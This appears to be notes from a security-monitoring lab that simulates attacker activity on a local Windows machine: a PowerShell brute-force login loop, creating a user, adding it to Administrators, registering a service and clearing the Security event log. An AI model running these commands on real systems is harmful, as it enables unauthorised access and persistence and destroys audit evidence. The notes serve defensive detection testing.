1. Brute Force Login Attack.
	A) PowerShell script used:
		$users = "admin", "test", "vboxuser"
		$passwords = "123456", "password", "admin", "wrongpass", "letmein"
		
		for ($i = 0; $i -lt 20; $i++) {
			$u = Get-Random $users
			$p = Get-Random $passwords
			
			net use \\127.0.0.1 /user:$u $p
			
			Start-Sleep -Milliseconds 300
		}
	
2. Unauthorized new user creation.
	A) PowerShell command used:
		net user soc_test_user [yourpassword] /add

3. User privilege escalation.
	A) PowerShell command used:
		net localgroup administrators soc_test_user /add
		
4. Service creation.
	A) PowerShell command used:
		sc.exe create trustedService binPath= "C:\Windows\System32\notepad.exe"
		
5. Attempting to clear the machine's logs.
	A) PowerShell command used:
		wevtutil cl Security
